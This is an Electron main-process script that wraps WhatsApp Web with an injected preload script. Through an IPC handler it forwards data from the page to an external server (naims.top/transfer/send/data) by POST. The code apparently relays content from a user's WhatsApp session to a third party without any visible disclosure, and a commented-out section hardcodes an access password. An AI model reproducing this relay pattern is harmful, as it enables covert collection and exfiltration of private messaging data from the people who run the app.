const { app, BrowserWindow, BrowserView } = require("electron/main");
const path = require("path");
const { ipcMain, net } = require("electron");

const createWindow = () => {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
  });

  const view = new BrowserView({
    webPreferences: {
      // devTools: true,
      contextIsolation: true,
      preload: path.resolve(__dirname, "content.js"),
    },
  });
  mainWindow.setBrowserView(view);
  view.setBounds({ x: 0, y: 0, width: 1000, height: 800 });
  view.setAutoResize({ width: true });
  const ses = view.webContents.session;
  ses.clearStorageData();
  view.webContents.loadURL("https://web.whatsapp.com", {
    extraHeaders: "pragma: no-cache\n",
    userAgent:
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  });
  view.webContents.openDevTools();

  let lastHandle;
  function handleWindowResize(e) {
    e.preventDefault();

    lastHandle = setTimeout(() => {
      if (lastHandle != null) clearTimeout(lastHandle);
      if (mainWindow)
        view.setBounds({
          x: 0,
          y: 0,
          width: mainWindow.getBounds().width,
          height: mainWindow.getBounds().height - 60,
        });
    });
  }

  mainWindow.on("resize", handleWindowResize);

  ipcMain.on("get-params", (event, data) => {
    console.log("收到来自渲染进程的消息:", data);
    // 在这里处理收到的消息
    const url = "https://www.naims.top/transfer/send/data";
    const request = net.request({
      method: "POST",
      url: url,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    request.write(data);
    request.end();
  });
};

// const vliadPassword = (cb) => {
//   const splash = new BrowserWindow({
//     width: 800,
//     height: 600,
// devTools: true,
// webPreferences: {
//   preload: path.join(__dirname, "preload.js"),
// },
// });

// splash.loadFile("index.html");
// splash.center();
// splash.webContents.openDevTools();

// ipcMain.on('send-password', (event, arg) => {
//   if (arg === '84886227') {
//     splash.close();
//     cb();
//   }
// });
// };

app.whenReady().then(() => {
  // vliadPassword(createWindow);

  app.on("activate", () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});
